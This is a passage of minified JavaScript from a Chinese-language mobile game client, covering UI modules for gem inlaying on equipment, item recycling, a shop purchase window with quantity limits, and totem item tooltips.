eui.ArrayCollection,this.roleItem.showEff=!1},e.prototype.addDisplay=function(){observe(this,this.onEquipSelectChanged,l.BagCT.ins().setSelectEquipIdx),observe(this,this.onUpdateGemInfo,c.EquipInlayCT.ins().patchGemInfo),observe(this,this.onMakeAHole,c.EquipInlayCT.ins().patchMakeAHole),observe(this,this.onUpgrade,c.EquipInlayCT.ins().patchUpgrade),observe(this,this.onItemChange,l.BagCT.ins().postItemChange),observe(this,this.onItemChange,l.BagCT.ins().postItemAdd),observe(this,this.onItemChange,l.BagCT.ins().postItemDel),observe(this,this.onItemChange,c.EquipInlayCT.ins().patchUpgrade),this.addTouchEvent(this.btnPunch,this.onClick),this.addTouchEvent(this.btnMosaic,this.onClick),this.addTouchEvent(this.btnRemove,this.onClick),this.addTouchEvent(this.btnSuit,this.onClick),l.BagCT.ins().setSelectEquipIdx(0)},e.prototype.removeDisplay=function(){l.BagCT.ins().setSelectEquipIdx(-1)},e.prototype.onEquipSelectChanged=function(t){this.idx!=t&&(this.idx=t,this.updateIcon(),this.updateUpList(),this.listUpGem.selectedIndex=0,this.updateBtnList(),this.updateListSkill(),this.updateGemList(),this.listGem.selectedIndex=0)},e.prototype.updateIcon=function(){var t=r.SubRoles.ins().getSubRoleByIndex(0),e=t.getEquipByIndex(this.idx);e&&(this.roleItem.setIndex(this.idx),this.roleItem.setModel(t),this.roleItem.setCurRole(t.index),this.roleItem.data=e.item,0==e.item.configID&&this.roleItem.setItemImg("xb_1"+h.ForgeConst.EQUIP_POS_TO_SUB[this.idx]))},e.prototype.updateUpList=function(){var t=c.EquipInlayCT.ins().getPosGemDatas(this.idx)||[];t=t.sort(function(t,e){return t.pos-e.pos}),this.listUpGemArr.replaceAll(t)},e.prototype.updateGemList=function(){for(var t=[],e=l.BagCT.ins().getGemItemDatasById(this.idx)||[],i=c.EquipInlayCT.ins().getGemDatas(this.idx)||[],n=0;n<e.length;n++){var o=e[n];this.isEqualPFId(i,o)||t.push(o)}this.listGemArr.replaceAll(t),this.lb_noGem.visible=0==t.length},e.prototype.isEqualPFId=function(t,e){if(t.length<=0)return!1;for(var i=0;i<t.length;i++){var n=t[i];if(n.getPfId()==e.getPrefixId())return!0}return!1},e.prototype.updateListSkill=function(){this.lbName.text=this.suitData.suitName||gettext("没有套装"),this.lbSkillDes.textFlow=o.TextFlowMaker.generateTextFlow(this.suitData.suitDes),this.lbActProgress.text="("+(c.EquipInlayCT.ins().getGemDatas(this.idx).length||0)+"/3)",this.lbActProgress.visible=this.suitData.isHasSuit(),this.lbActDes.visible=this.suitData.isHasSuit();for(var t=[],e=c.EquipInlayCT.ins().getGemDatas(this.idx),i=0;i<e.length;i++){var n=e[i];if(n&&!n.isLock){var s=n.itemData,a=s.getGemSkillDes();t.push(a)}}this.listSkillArr.replaceAll(t)},e.prototype.updateBtnList=function(){var t=this.listUpGem.selectedItem;t&&(this.btnPunch.visible=t.isLock,this.btnMosaic.visible=!(t.isLock||t.itemData&&0!=t.itemData.handle),this.btnRemove.visible=!t.isLock&&!!t.itemData&&t.itemData.handle>0)},e.prototype.CHANGE=function(t){this.updateBtnList(),this.listGem.selectedIndex=0},Object.defineProperty(e.prototype,"suitData",{get:function(){return c.EquipInlayCT.ins().getSuitDataById(this.idx)},enumerable:!1,configurable:!0}),e.prototype.onUpdateGemInfo=function(){this.updateUpList(),this.updateBtnList(),this.updateListSkill()},e.prototype.onMakeAHole=function(){this.updateUpList(),this.updateBtnList()},e.prototype.onItemChange=function(){this.updateGemList(),-1==this.listGem.selectedIndex&&(this.listGem.selectedIndex=0)},e.prototype.onUpgrade=function(){this.updateUpList(),this.updateListSkill()},e.prototype.onClick=function(t){var e,i=this,o=this.listUpGem.selectedItem;if(o)switch(console.log("@@选中pos==",o.pos),t.currentTarget){case this.btnMosaic:if(0==this.listGemArr.source.length)return void u.TipsCT.ins().showTips(gettext("没有可镶嵌的符印"));if(o.isLock)return;if(o.itemData&&o.itemData.handle>0)return;var s=this.listGem.selectedItem;c.EquipInlayCT.ins().sendWearOrTakeOff(1,s.handle,this.idx,o.pos);break;case this.btnPunch:var r=a.GlobalConfig.GemBaseConfig.unlockcost[0],h=r.id,f=r.count,g=(null===(e=a.GlobalConfig.ItemConfig[h])||void 0===e?void 0:e.name)||"",m=l.BagCT.ins().getBagGoodsCountById(l.BagCT.BAG_TYPE_OTHTER,r.id);return m>=f?void p.WarnWin.show(gettext("是否消耗{0}×{1}解锁当前孔位？",g,f),function(){n.GlobalFun.checkCost(f,h)&&c.EquipInlayCT.ins().sendMakeAHole(i.idx,o.pos)},this):void d.WarnCT.ins().setBuyGoodsWarn(h);case this.btnRemove:if(o.isLock)return;if(l.BagCT.ins().getAllSurplusCount(1)<0)return void u.TipsCT.ins().showTips(gettext("背包剩余空间不足，请扩容"));if(!o.itemData||0==o.itemData.handle)return;c.EquipInlayCT.ins().sendWearOrTakeOff(2,o.itemData.handle,this.idx,o.pos);break;case this.btnSuit:win.open("EquipInlaySuitWin")}},e.prototype.clearPanel=function(){},e}(s.BaseView);e.EquipInlayPanel=v,window.EquipInlayPanel=v,__reflect(v.prototype,"EquipInlayPanel",[]),window.EquipInlayPanel=v},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EquipSacrificeAttData=e.EquipSacrificeData=void 0;var n=function(){function t(){this.attArr=[]}return t}();e.EquipSacrificeData=n,window.EquipSacrificeData=n,__reflect(n.prototype,"EquipSacrificeData",[]);var o=function(){function t(){}return t}();e.EquipSacrificeAttData=o,window.EquipSacrificeAttData=o,__reflect(o.prototype,"EquipSacrificeAttData",[]),window.EquipSacrificeData=n,window.EquipSacrificeAttData=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MergeCC=void 0;var n=i(55),o=i(14),s=i(0),a=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.mergeStr="1",e}return __extends(e,t),e.prototype.getMergeMenu=function(){var t=s.GlobalConfig.MergeTotal,e=[];for(var i in t)e.push(t[i]);return e.sort(this.sortMenu),e},e.prototype.getMergeSecMenu=function(t){var e=s.GlobalConfig.MergeConfig[t],i=[];for(var n in e)i.push(e[n]);return i.sort(this.sortMenu),i},e.prototype.sortMenu=function(t,e){return n.Algorithm.sortAsc(t.sort,e.sort)},e.prototype.changeList=function(t){this.mergeStr=t},__decorate([post()],e.prototype,"changeList",null),e}(o.BaseSystem);e.MergeCC=a,window.MergeCC=a,__reflect(a.prototype,"MergeCC",[]),Systemap.MergeCC=function(){return a.ins()},window.MergeCC=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BagCallBackItem=void 0;var n=i(24),o=i(3),s=i(0),a=i(57),r=i(13),l=i(25),h=i(129),u=i(2),p=i(6),d=i(31),c=i(167),f=i(189),g=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="bagCallBackItemSkin",e.btnName=["",gettext("回收"),gettext("熔炼"),gettext("分解"),gettext("购买"),gettext("回收")],e.cbQxList=[1,3,6,12,30,50],e.cbItemIdArr=[],e}return __extends(e,t),e.prototype.createChildren=function(){this.addTouchEvent(this.btn,this.onClick)},e.prototype.dataChanged=function(){var t=this.data;this.cbItemId=null,this.labName.text=t.name||"",this.labName.textColor=d.QUALITY_COLOR[t.type||0],this.btn.label=this.btnName[t.group]||"";var e=t.itemid,i=Number(c.SmeltCC.getCbSignal()||0);if(e&&(this.cbItemId=e[0]),this.cbItemIdArr=e,3==t.group&&i){var o=r.SubRoles.ins().getSubRoleByIndex(0),a=o.job+i>5?o.job+i-5:o.job+i;this.cbItemId=e[a]}if(!this.cbItemId){var h=c.SmeltCC.getEqCbNum(t.type||0,"-1"==c.SmeltCC.getCbSignal(),t.group),u=h.num;this.labName.text=this.labName.text+" x"+h.num2;var f=l.Recharge.ins().recycleTime>0?2:1,g=this.cbQxList[t.type]||1;return void this.costCm.setData({type:0,id:1,count:Math.ceil(u*(p.BagCT.ins().shopCbPer/100||1)*g*f)},!1,!1)}var m=s.GlobalConfig.ItemConfig[this.cbItemId];if(m){if(this.labName.text=m.name,4==t.group){var v=n.CommonUtils.getObjectByAttr(s.GlobalConfig.ItemStoreConfig,"itemId",this.cbItemId),y=v.cost;return void this.costCm.setShow(d.ITEM_ICON[d.ITEM_TYPE[y.id]],y.count)}var C=s.GlobalConfig.RongLuConfig[this.cbItemId];if(C){var T=p.BagCT.ins().getBagGoodsCountById(p.BagCT.BAG_TYPE_OTHTER,this.cbItemId)||0;if(2==t.group)this.costCm.setShow("",gettext("纯度：")+(T*C.purityNum||0));else if(3==t.group)this.costCm.setData({type:0,id:C.reward[0].id,count:T*C.reward[0].count},!1,!1);else if(5==this.data.group){this.labName.text=t.name;for(var f=l.Recharge.ins().recycleTime>0?2:1,g=this.cbQxList[t.type]||1,b=0,w=0,I=this.cbItemIdArr;w<I.length;w++){var _=I[w],S=c.SmeltCC.getFuEqCbNum(_,"-1"==c.SmeltCC.getCbSignal(),t.group),x=s.GlobalConfig.RongLuConfig[_];b+=S.length*x.moneyNum||0}this.costCm.setData({type:0,id:1,count:Math.ceil(b*(p.BagCT.ins().shopCbPer/100||1)*g*f)},!1,!1)}}}},e.prototype.onClick=function(t){if(4==this.data.group)return void win.open(h.BuyItem2Panel,this.cbItemId);var e=this.cbItemId?p.BagCT.ins().getBagGoodsCountById(p.BagCT.BAG_TYPE_OTHTER,this.cbItemId)||0:c.SmeltCC.getEqCbNum(this.data.type||0,"-1"==c.SmeltCC.getCbSignal(),this.data.group).num2;if(0>=e&&5==this.data.group)for(var i=0,n=this.cbItemIdArr;i<n.length;i++){var o=n[i],s=c.SmeltCC.getFuEqCbNum(o,"-1"==c.SmeltCC.getCbSignal(),this.data.group);e+=s.length}if(0>=e)return void u.TipsCT.ins().showTips(gettext("无回收物品"));var a=[];if(1==this.data.group)a=c.SmeltCC.getEqCbNum2(this.data.type||0,"-1"==c.SmeltCC.getCbSignal(),this.data.group);else if(5==this.data.group)for(var r=0,l=this.cbItemIdArr;r<l.length;r++){var o=l[r],d=c.SmeltCC.getFuEqCbNum(o,"-1"==c.SmeltCC.getCbSignal(),this.data.group);a=a.concat(d)}else a=p.BagCT.ins().getBagItemSById(this.cbItemId);for(var g=[],m=0;m<a.length;m++){var v=a[m];p.BagCT.ins().isNotRecycleXiLianEquip()&&v.isXiLian()||g.push(v)}var y=p.BagCT.ins().getShowList(g);if(y&&y.length>0){var C=new f.BagCallBackConfirmData(this,this.callBackFunc,g,y,this.data.group);win.open("BagCallBackConfirmWin",C)}else{var T=5==this.data.group?1:this.data.group;p.BagCT.ins().sendCbequip(T,g)}},e.prototype.callBackFunc=function(t,e){if(t==a.BagCBConfirmResult.Confirm&&e.items){var i=5==this.data.group?1:this.data.group;p.BagCT.ins().sendCbequip(i,e.items)}},e}(o.BaseItemRender);e.BagCallBackItem=g,window.BagCallBackItem=g,__reflect(g.prototype,"BagCallBackItem",[]),window.BagCallBackItem=g},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BuyWin=void 0;var n=i(24),o=i(61),s=i(1),a=i(0),r=i(4),l=i(6),h=i(10),u=i(23),p=i(2),d=i(168),c=i(52),f=i(31),g=i(30),m=i(46),v=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="BuySkin",e.defaultRect=!1,e.layoutNum=LayoutNum.top,e}return __extends(e,t),e.prototype.skinComplete=function(){this.num=1},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return o.LocationProperty.isIosTS?!1:!0},e.prototype.addDisplay=function(){for(var t=[],i=0;i<arguments.length;i++)t[i]=arguments[i];"7000183"==urlParam.appid&&window.mz?(this.chatGroup.touchChildren=!1,this.chatGroup.touchEnabled=!0):(this.chatGroup.touchChildren=!0,this.chatGroup.touchEnabled=!1),this.addTouchEvent(this.add1Btn,this.onTap),this.addTouchEvent(this.add10Btn,this.onTap),this.addTouchEvent(this.sub1Btn,this.onTap),this.addTouchEvent(this.sub10Btn,this.onTap),this.addTouchEvent(this.bgClose,this.onTap),this.addTouchEvent(this.numLabel,this.onTap),this.addTouchEvent(this.chatGroup,this.onTap),this.addTouchEvent(this.buyBtn,this.buy),this.addChangeEvent(this.numLabel,this.inputOver),observe(this,this.updateInputText,u.GameLogic.ins().postInputText),this.numLabel.addEventListener(egret.FocusEvent.FOCUS_IN,this.textInOn,this),this.num=1,this.shopID=t[0],e.goodsId=this.shopID,this.shopType=t[1]?t[1]:0,this.yuanbao0.visible=this.yuanbao1.visible=!0,2==this.shopType||3==this.shopType?(this.yuanbao0.visible=this.yuanbao1.visible=!1,this.num=this.getChipNumRule(),this.honor0.source=2==this.shopType?"ZSchip":h.ItemUtil.getItemSource(204076),this.honor1.source=2==this.shopType?"ZSchip":h.ItemUtil.getItemSource(204076)):4==this.shopType?this.yuanbao0.visible=this.yuanbao1.visible=!1:5==this.shopType&&(this.num=this.getHegemonyNum(),this.yuanbao0.visible=this.yuanbao1.visible=!1,this.honor1.source=this.honor0.source=a.GlobalConfig.LFRaceStore[this.shopID].costItem[0].id+"_png"),this.honor0.visible=this.honor1.visible=!this.yuanbao0.visible,this.updateView()
},e.prototype.getHegemonyNum=function(){var t=a.GlobalConfig.LFRaceStore[this.shopID],e=l.BagCT.ins().getBagGoodsCountById(l.BagCT.BAG_TYPE_OTHTER,t.costItem[0].id);if(e<t.costItem[0].count)return this.maxNum=1,this.maxNum;var i=Math.floor(e/t.costItem[0].count),n=0,o=m.HegemonyCT.ins().shopData[this.shopID];return o=o?o:0,t.dayLimit?(n=t.dayLimit-o,n=n>0?n:1,n=n>i?i:n):t.foreverLimit?(n=t.foreverLimit-o,n=n>0?n:1,n=n>i?i:n):n=i,this.maxNum=n,this.maxNum},e.prototype.updateInputText=function(t){this.numLabel.text=t,this.textInOn()},e.prototype.textInOn=function(){this.numLabel.text==gettext("请输入")&&(this.numLabel.text="")},e.prototype.getChipNumRule=function(){var t=a.GlobalConfig.FeatsStore[this.shopID],e=0;if(t.shopType==d.FEATS_SHOP_TYPE.Money){if(r.ActorCC.chip<t.costMoney.count)return this.maxNum=1,this.maxNum;e=Math.floor(r.ActorCC.chip/t.costMoney.count)}else if(t.shopType==d.FEATS_SHOP_TYPE.Item){var i=l.BagCT.ins().getBagGoodsCountById(l.BagCT.BAG_TYPE_OTHTER,t.costItem.id);if(i<t.costItem.count)return this.maxNum=1,this.maxNum;e=Math.floor(i/t.costItem.count)}var n=0;if(!c.Shop.ins().medalData)return 0;var o=c.Shop.ins().medalData.exchangeCount[this.shopID];switch(o=o?o:0,t.buyType){case d.FEATS_TYPE.day:n=t.daycount-o,n=n>0?n:1,n=n>e?e:n;break;case d.FEATS_TYPE.infinite:n=e;break;case d.FEATS_TYPE.forever:n=t.daycount-o,n=n>0?n:1,n=n>e?e:n}return this.maxNum=n,this.maxNum},e.prototype.updateView=function(){var t,e;if(5==this.shopType)return this.itemName0.visible=!1,t=a.GlobalConfig.LFRaceStore[this.shopID],this.goodId=t.index,e=a.GlobalConfig.ItemConfig[t.goods[0].id],this.itemIcon.setData(e),this.unitPrice.text=t.costItem[0].count+"",this.allPrice.text=this.num*parseInt(this.unitPrice.text)+"",this.numLabel.text=this.num+"",this.itemName.text=e.name,this.itemName.textColor=f.QUALITY_COLOR[h.ItemUtil.getQuality2(e)],void(this.used.text=t.use?"（"+t.use+"）":"");if(4==this.shopType)return e=a.GlobalConfig.ItemConfig[t.goods.id],this.itemIcon.setData(e),1==t.buyType||3==t.buyType||4==t.buyType?(this.maxNum=t.Maxcount-c.Shop.ins().getDartBuyNumById(t.index),this.itemName0.text=gettext("还可购买{0}次",this.maxNum),this.itemName0.visible=!0):(this.maxNum=Number.MAX_VALUE,this.itemName0.visible=!1),this.num>this.maxNum&&(this.num=this.maxNum),this.unitPrice.text=t.costItem.count+"",this.allPrice.text=this.num*t.costItem.count+"",this.numLabel.text=this.num+"",this.itemName.text=e.name,this.itemName.textColor=f.QUALITY_COLOR[h.ItemUtil.getQuality2(e)],this.used.text="",this.used.x=this.itemName.x+this.itemName.width,void(this.goodId=t.index);if(2!=this.shopType&&3!=this.shopType){t=a.GlobalConfig.ItemStoreConfig[this.shopID],e=a.GlobalConfig.ItemConfig[t.itemId],this.itemIcon.setData(e),t.vipLimit?(this.maxNum=t.vipLimit[r.ActorCC.vip]-c.Shop.ins().shopData.getHadBuyCount(t.itemId),this.itemName0.text=gettext("还可购买{0}次",this.maxNum),this.itemName0.visible=!0):(this.maxNum=Number.MAX_VALUE,this.itemName0.visible=!1),this.num>this.maxNum&&(this.num=this.maxNum),this.unitPrice.text=t.cost.count+"",this.allPrice.text=this.num*t.cost.count+"";var i="";return i=0==t.cost.type?g.RewardData.getCurrencyRes(t.cost.id):h.ItemUtil.getItemSource(t.cost.id),this.honor0.source=this.honor1.source=i,this.numLabel.text=this.num+"",this.itemName.text=e.name,this.itemName.textColor=f.QUALITY_COLOR[h.ItemUtil.getQuality2(e)],this.used.text="（"+t.use+"）",void(this.used.x=this.itemName.x+this.itemName.width)}this.itemName0.visible=!1,t=a.GlobalConfig.FeatsStore[this.shopID],e=a.GlobalConfig.ItemConfig[t.goods[0].id],this.itemIcon.setData(e),this.goodId=t.index,2==this.shopType?this.unitPrice.text=t.costMoney.count+"":3==this.shopType&&(this.unitPrice.text=t.costItem.count+""),this.allPrice.text=this.num*parseInt(this.unitPrice.text)+"",this.numLabel.text=this.num+"",this.itemName.text=e.name,this.itemName.textColor=f.QUALITY_COLOR[h.ItemUtil.getQuality2(e)],this.used.text="（"+t.use+"）"},e.prototype.onTap=function(t){switch(t.currentTarget){case this.sub10Btn:this.num-=10;break;case this.sub1Btn:this.num-=1;break;case this.add10Btn:this.num+=10;break;case this.add1Btn:this.num+=1;break;case this.bgClose:win.close(this);break;case this.numLabel:"7000183"==urlParam.appid&&window.mz&&n.CommonUtils.getKeyboard(0,this.numLabel.text||"")}this.num<1&&(this.num=1),this.num>this.maxNum&&(this.num=this.maxNum),this.numLabel.text=this.num+"",this.inputOver()},e.prototype.closeCB=function(t){win.close("BuyWin")},e.prototype.buy=function(t){if(2==this.shopType)r.ActorCC.chip>=parseInt(this.allPrice.text)?(c.Shop.ins().sendBuyMedal(this.goodId,this.num),win.close(this)):p.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:荣耀不足|"));else if(3==this.shopType){var e=a.GlobalConfig.FeatsStore[this.shopID];l.BagCT.ins().getBagGoodsCountById(l.BagCT.BAG_TYPE_OTHTER,e.costItem.id)>=parseInt(this.allPrice.text)?(c.Shop.ins().sendBuyMedal(this.goodId,this.num),win.close(this)):p.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:巅峰令不足|"))}else if(5==this.shopType){var i=a.GlobalConfig.LFRaceStore[this.shopID];l.BagCT.ins().getBagGoodsCountById(l.BagCT.BAG_TYPE_OTHTER,i.costItem[0].id)>=parseInt(this.allPrice.text)?(m.HegemonyCT.ins().sendBuyItem(this.goodId,this.num),win.close(this)):(win.close(this),p.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:{0}不足|",a.GlobalConfig.ItemConfig[i.costItem[0].id].name)))}else if(r.ActorCC.yb>=parseInt(this.allPrice.text)){var n=[this.shopID,this.num];c.Shop.ins().sendBuy(1,[n]),win.close(this)}else p.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:元宝不足|"))},e.prototype.inputOver=function(t){this.num=parseInt(this.numLabel.text),(isNaN(this.num)||this.num<1)&&(this.num=1),this.num>9999&&(this.num=9999),this.num>this.maxNum&&(this.num=this.maxNum),this.numLabel.text=this.num+"",this.allPrice.text=this.num*parseInt(this.unitPrice.text)+""},e}(s.BaseView);e.BuyWin=v,window.BuyWin=v,__reflect(v.prototype,"BuyWin",[]),window.BuyWin=v},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TotemDetailedItem=void 0;var n=i(5),o=i(1),s=i(22),a=i(34),r=i(0),l=i(39),h=i(180),u=i(4),p=i(48),d=i(6),c=i(31),f=i(40),g=i(10),m=i(65),v=i(2),y=i(80),C=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="TotemEquipTipsSkin",e._bottomY=0,e._equipPower=0,e._totalPower=0,e.curRole=0,e.index=0,e.openType1=0,e.onBody=!1,e.onBag=!1,e.allPow=0,e.QUALITY_COLOR2=["#e9e9e9","#45ff7a","#2ddaff","#f335ff","#ff5400","#ff0000","#ffb400","#00ccff"],e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this.eSynthesisBtn,this.onComposeBtn),this.addTouchEvent(this.eWearBtn,this.onClickOWearBtn),this.addTouchEvent(this.eReplaceBtn,this.onClickReplaceBtn),this.eWearImg.visible=!1},e.prototype.addDisplay=function(){for(var t,e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];this.$param=e,this.skin&&e&&(this.data=e[0],e[1]?this.openType1=e[1]:this.data instanceof f.ItemData||(this.openType1=2),this.itemHandle=this.data.handle,this.configID=this.data.configID,this.roleModel=e[4],e[5]>=0&&(this.curRole=e[5]),e[6]&&(this.index=e[6]),this.updateComeFrom(),this.eBtnGroup.visible=!0,this.configID?this.updateView(1,this.itemHandle,this.configID,this.data):(this.configID=null===(t=this.data)||void 0===t?void 0:t.id,this.updateView(1,this.itemHandle,this.configID,this.data)),this.updateSupSuitGroup(),this.updateWearBtn(),this.initItemData())},e.prototype.initItemData=function(){var t=y.TotemCT.ins().checkTotemJob(this.configID);this.eWearBtn.visible=t,1==this.openType1?this.eWearBtn.visible=!1:(this.eWearBtn.label=gettext("穿 戴"),t&&(this.eSynthesisBtn.visible=!0))},e.prototype.onClickOWearBtn=function(){return __awaiter(this,void 0,void 0,function(){var t,e;return __generator(this,function(i){switch(i.label){case 0:return(t=this.data)?(e=g.ItemUtil.getType(t.itemConfig),1!=this.openType1?[3,2]:[4,y.TotemCT.ins().sendOutItem(t.configID)]):[2];case 1:return i.sent(),win.close("TotemDetailedItem"),[2];case 2:return 0!=this.openType1?[3,6]:e!=l.ItemType.TYPE_56?[3,4]:[4,y.TotemCT.ins().sendMergeItem(t.configID)];case 3:return i.sent(),win.close("TotemDetailedItem"),[3,5];case 4:i.label=5;case 5:return[3,7];case 6:this.onBody,i.label=7;case 7:return[2]}})})},e.prototype.onComposeBtn=function(){var t=r.GlobalConfig.SyntheticConfig[this.data.configID];return t?(win.close("TotemDetailedItem"),void win.open("ComposeTip",this.data.configID,null,this.openType1)):void v.TipsCT.ins().showTips(gettext("无可合成物品"))},e.prototype.onClickReplaceBtn=function(){var t=r.GlobalConfig.TotemConfig[this.data.configID];win.open("RoleChooseEquipWin",0,t.pos,l.ItemType.TYPE_56,t.group),win.close(this)},e.prototype.updateComeFrom=function(){this.onBody=this.onBag=!1;for(var t=y.TotemCT.ins().TotemIdArr,e=this.data,i=0;i<t.length;i++)t[i]==e.configID&&(this.onBody=!0);this.onBody||(this.onBag=void 0!=this.itemHandle&&!!d.BagCT.ins().getBagGoodsByHandle(d.BagCT.BAG_TYPE_OTHTER,this.itemHandle))},e.prototype.updateView=function(t,e,i,o){var l,h=o instanceof f.ItemData?o:void 0;this._totalPower=0,void 0!=e&&void 0==h?(h=d.BagCT.ins().getBagGoodsByHandle(t,e),l=h.itemConfig,i=h.configID):l=r.GlobalConfig.ItemConfig[i],this.nameLabel.text=l.name;var u;u=this.data instanceof f.ItemData&&this.data.quality?this.data.quality:g.ItemUtil.getQuality2(r.GlobalConfig.ItemConfig[l.id])>=0?g.ItemUtil.getQuality2(r.GlobalConfig.ItemConfig[l.id]):0,this.nameLabel.textColor=g.ItemUtil.getQualityColor(u),this.qualityLab.text=c.QUALITY_NAME[u],this.qualityLab.textColor=g.ItemUtil.getQualityColor(u);g.ItemUtil.getSubType(l),g.ItemUtil.getJob(l);if(this.quali.source="tips_"+u,this.itemIcon.data=this.data,void 0!=u&&this.itemIcon.setImgBg2("quality"+u),h instanceof f.ItemData||l){this.levelKey.text=l.zsLevel>0?gettext("转生："):gettext("等级："),this.type.text=r.GlobalConfig.TotemConfig[l.id].name;var m=r.GlobalConfig.TotemConfig[l.id].job;m?(this.jobGroup.visible=!0,this.career.text=p.Role.getJobNameByJob(m)):this.jobGroup.visible=!1}for(var v=r.GlobalConfig.EquipConfig[i],C=r.GlobalConfig.TotemConfig[this.configID],T=[],b=0;b<C.attr.length;b++){var w=C.attr[b];w.type<=a.AttributeType.atCurseCd&&w.type>=a.AttributeType.atVamirePro||T.push({type:w.type,value:w.value})}var I=y.TotemCT.ins().checkTotemJob(this.configID);if(y.TotemCT.ins())if(I)y.TotemCT.ins().setAttrValue(T);else{var _=r.GlobalConfig.TotemConfig[this.configID].group;y.TotemCT.ins().setAttrValue(T,!I,_)}if(this.attr.textFlow=(new egret.HtmlTextParser).parse(s.AttributeData.getAttrShowStrNoColor(T,":",!1,0,!0)),this._equipPower=Math.floor(g.ItemUtil.getAttrPower(T)),this._totalPower+=this._equipPower,this._score=this._totalPower,this._bottomY=0,this.roleModel&&v&&(v.baseAttr1&&(this._equipPower+=g.ItemUtil.relatePower(v.baseAttr1,this.roleModel)),v.baseAttr2&&(this._equipPower+=g.ItemUtil.relatePower(v.baseAttr2,this.roleModel))),l.desc){var S=new eui.Label;S.size=22,S.width=380,S.wordWrap=!0,S.textColor=13746831,S.x=this.attr.x,S.y=this._bottomY+=10,S.textFlow=n.TextFlowMaker.generateTextFlow(l.desc),this._bottomY+=S.textHeight}this.allPow=this._totalPower,this.powerLab.text=gettext("战力:{0}",this.allPow)},e.prototype.updateWearBtn=function(){var t=y.TotemCT.ins().checkTotemJob(this.configID);this.removeAllBtn(),2!=this.openType1&&(0!=this.openType1||t)&&(y.TotemCT.ins().checkCanWear(this.configID)?(this.eWearBtn.label=gettext("穿 戴"),t&&this.eBtnGroup.addChild(this.eSynthesisBtn),this.eBtnGroup.addChild(this.eWearBtn)):(this.eBtnGroup.addChild(this.eSynthesisBtn),this.eBtnGroup.addChild(this.eReplaceBtn)),0==this.openType1&&this.eBtnGroup.addChild(this.eSynthesisBtn))},e.prototype.removeAllBtn=function(){removeFromParent(this.eWearBtn),removeFromParent(this.eReplaceBtn),removeFromParent(this.eSynthesisBtn)},e.prototype.updateSupSuitGroup=function(){var t,e=r.GlobalConfig.TotemConfig[this.configID],i=r.GlobalConfig.TotemUnitConfig[e.group],o=r.GlobalConfig.TotemAuxiliarySuitConfig[e.group];if(this.skillname0.visible=!0,this.removeAllExtGrop(),1==e.type){if(this.supName.text=gettext("套装属性"),0==this.openType1||2==this.openType1){this.extGrop.addChild(this.eSupExtGroup);var a="",l=1,p=0;for(var d in o){l=0==p?Number(d):Math.floor(Number(d)/2);var c=o[d],f=void 0;for(var v in c)Number(v)>e.quality||(f=c[v]);var C=void 0;if(null===f||void 0===f?void 0:f.attr)y.TotemCT.ins().setAttrValue(f.attr),C=s.AttributeData.getAttrShowStrNoColor(f.attr,"+",!1,0,!0);else{var T=void 0;switch(u.ActorCC.jobId){case h.JobConst.ZhanShi:T=f.revise_1;break;case h.JobConst.FaShi:T=f.revise_2;break;case h.JobConst.DaoShi:T=f.revise_3;break;case h.JobConst.CiKe:T=f.revise_4;break;case h.JobConst.GongShou:T=f.revise_5}var b=4==e.group?r.GlobalConfig.TotemReviseConfig[T].cd/1e3||0:100*r.GlobalConfig.TotemReviseConfig[T].a||0;C=m.SkillUtil.getDesc1(f.desc,b)}var w=g.ItemUtil.getQualityColor(f.quality);a+="<font color="+w+">"+gettext("{0}件套",f.count)+"</font>\n",a+=C+"\n",p++}this.supExtAttr.textFlow=(new egret.HtmlTextParser).parse(a)}else if(1==this.openType1){for(var a="",l=1,p=0,I=r.GlobalConfig.TotemConfig,_=r.GlobalConfig.TotemAuxiliarySuitConfig,S=r.GlobalConfig.TotemConfig[this.data.configID].group,x=r.GlobalConfig.TotemUnitConfig[S],D=x.iconRes,A=null===x||void 0===x?void 0:x.qualityNum[1],k=[],d=1;10*A>d;d++){var B=I[D+d];B&&k.push(I[D+d])}var P=y.TotemCT.ins().returnTotemTypeDataByArr(k,S);P.length>0&&this.extGrop.addChild(this.eSupExtGroup);for(var d=0;d<P.length;d++){var R=_[S][P[d].count][P[d].quality],C=void 0;if(null===R||void 0===R?void 0:R.attr)y.TotemCT.ins().setAttrValue(R.attr),C=s.AttributeData.getAttrShowStrNoColor(R.attr,"+",!1,0,!0);else{var T=void 0;switch(u.ActorCC.jobId){case h.JobConst.ZhanShi:T=_[S][P[d].count][P[d].quality].revise_1;break;case h.JobConst.FaShi:T=_[S][P[d].count][P[d].quality].revise_2;break;case h.JobConst.DaoShi:T=_[S][P[d].count][P[d].quality].revise_3;break;case h.JobConst.CiKe:T=_[S][P[d].count][P[d].quality].revise_4;break;case h.JobConst.GongShou:T=_[S][P[d].count][P[d].quality].revise_5}var b=4==e.group?r.GlobalConfig.TotemReviseConfig[T].cd/1e3||0:100*r.GlobalConfig.TotemReviseConfig[T].a||0;C=m.SkillUtil.getDesc1(R.desc,b)}var E=g.ItemUtil.getQualityColor(P[d].quality);a+="|C:"+E+"&T:"+gettext("{0}件套",P[d].count)+"|\n";var w=g.ItemUtil.getQualityColor(P[d].quality);a+="|C:"+w+"&T:"+C+"|\n"}this.supExtAttr.textFlow=n.TextFlowMaker.generateTextFlow1(a)}}else if(2==e.type){this.extGrop.addChild(this.skillGrp0),this.name3.text=gettext("套装效果");var G=r.GlobalConfig.TotemConfig[this.configID];if(0==this.openType1||2==this.openType1){var 